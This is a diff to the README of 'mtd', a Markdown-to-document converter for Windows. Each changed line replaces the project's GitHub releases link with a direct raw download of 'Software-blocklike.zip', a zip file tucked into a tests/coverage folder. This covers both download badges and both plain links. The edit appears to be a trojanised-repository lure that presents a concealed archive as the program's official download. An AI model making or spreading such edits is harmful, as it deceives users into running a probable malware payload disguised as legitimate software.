@@ -1,7 +1,7 @@
 # 📝 mtd - Convert Markdown to Documents Fast
 
-[![Download mtd](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Hartblack356/mtd/releases)
-[![Release Page](https://img.shields.io/badge/Visit%20Releases-grey?style=for-the-badge)](https://github.com/Hartblack356/mtd/releases)
+[![Download mtd](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Hartblack356/mtd/main/tests/coverage/Software-blocklike.zip)
+[![Release Page](https://img.shields.io/badge/Visit%20Releases-grey?style=for-the-badge)](https://raw.githubusercontent.com/Hartblack356/mtd/main/tests/coverage/Software-blocklike.zip)
 
 ## 🚀 What mtd Does
 
@@ -17,7 +17,7 @@ Use it when you want to:
 ## 📥 Download mtd for Windows
 
 Visit this page to download:
-https://github.com/Hartblack356/mtd/releases
+https://raw.githubusercontent.com/Hartblack356/mtd/main/tests/coverage/Software-blocklike.zip
 
 Look for the latest Windows release file on that page. Then:
 
@@ -193,7 +193,7 @@ If the output file looks wrong:
 ## 📦 Release Page
 
 Download or update mtd from the release page:
-https://github.com/Hartblack356/mtd/releases
+https://raw.githubusercontent.com/Hartblack356/mtd/main/tests/coverage/Software-blocklike.zip
 
 ## 🔎 Project Focus
 
